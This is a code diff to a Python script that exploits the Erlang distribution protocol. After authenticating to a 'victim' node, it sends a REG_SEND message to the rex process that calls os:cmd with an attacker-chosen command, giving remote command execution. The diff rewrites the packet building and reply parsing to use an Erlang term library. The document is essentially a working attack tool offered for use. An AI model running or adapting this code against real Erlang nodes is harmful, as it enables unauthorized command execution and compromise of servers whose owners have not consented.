@@ -9,6 +9,7 @@ from random import choice
 from string import ascii_uppercase
 import sys
 import argparse
+import erlang as erl
 
 def rand_id(n=6):
   return ''.join([choice(ascii_uppercase) for c in range(n)]) + '@nowhere'
@@ -61,11 +62,42 @@ else:
   digest = sock.recv(16)
   assert(len(digest) == 16)
 
+
+print('[*] authenticated onto victim')
+
+
+
+# Once connected, protocol between us and victim is described
+# at http://erlang.org/doc/apps/erts/erl_dist_protocol.html#protocol-between-connected-nodes
+# it is roughly a variant of erlang binary term format
+# the format also depends on the version of ERTS post (incl.) or pre 5.7.2
+# the format used here is based on pre 5.7.2, the old one
+
+def erl_dist_recv(f):
+  hdr = f.recv(4)
+  if len(hdr) != 4: return
+  (length,) = unpack('!I', hdr)
+  data = f.recv(length)
+  if len(data) != length: return
+
+  # remove 0x70 from head of stream
+  data = data[1:]
+
+  while data:
+    (parsed, term) = erl.binary_to_term(data)
+    if parsed <= 0:
+      print('failed to parse erlang term, may need to peek into it')
+      break
+
+    yield term
+
+    data = data[parsed:]
+
+
 def encode_string(name, type=0x64):
   return pack('!BH', type, len(name)) + name
 
-
-def send_cmd(name, cmd):
+def send_cmd_old(name, cmd):
   data = (unhexlify('70836804610667') + 
     encode_string(name) + 
     unhexlify('0000000300000000006400006400037265') +
@@ -82,36 +114,38 @@ def send_cmd(name, cmd):
 
   return pack('!I', len(data)) + data
 
-def hexdump(src, length=16):
-    FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or '.' for x in range(256)])
-    lines = []
-    for c in xrange(0, len(src), length):
-        chars = src[c:c+length]
-        hex = ' '.join(["%02x" % ord(x) for x in chars])
-        printable = ''.join(["%s" % ((ord(x) <= 127 and FILTER[ord(x)]) or '.') for x in chars])
-        lines.append("%04x  %-*s  %s\n" % (c, length*3, hex, printable))
-    return ''.join(lines)
+
+
+def send_cmd(name, cmd):
+  # REG_SEND control message
+  ctrl_msg = (6,
+    erl.OtpErlangPid(erl.OtpErlangAtom(name),'\x00\x00\x00\x03','\x00\x00\x00\x00','\x00'),
+    erl.OtpErlangAtom(''),
+    erl.OtpErlangAtom('rex'))
+  msg = (
+    erl.OtpErlangPid(erl.OtpErlangAtom(name),'\x00\x00\x00\x03','\x00\x00\x00\x00','\x00'),
+    (
+      erl.OtpErlangAtom('call'),
+      erl.OtpErlangAtom('os'),
+      erl.OtpErlangAtom('cmd'),
+      [cmd],
+      erl.OtpErlangAtom('user')
+    ))
+
+  new_data = '\x70' + erl.term_to_binary(ctrl_msg) + erl.term_to_binary(msg)
+
+  return pack('!I', len(new_data)) + new_data
+
+def recv_reply(f):
+  terms = [t for t in erl_dist_recv(f)]
+  assert(len(terms) == 2)
+  answer = terms[1]
+  assert(len(answer) == 2)
+  return answer[1]
 
 sock.sendall(send_cmd(name, args.cmd))
 
-def recv_reply(f):
-  data = f.recv(4)
-  assert(len(data) == 4)
-
-  (length,) = unpack('!I', data)
-
-  data = f.recv(length)
-  assert(len(data) == length)
-
-  (header, footer) = data.split(unhexlify('00000003000000000083'))
-  (header, footer) = footer.split(unhexlify('6b'))
-
-  (length,) = unpack('!H', footer[:2])
-  assert(len(footer[2:]) == length)
-
-  return footer[2:]
-
-data = recv_reply(sock)
-sys.stdout.write(data)
+reply = recv_reply(sock)
+sys.stdout.write(reply)
 
 sock.close()
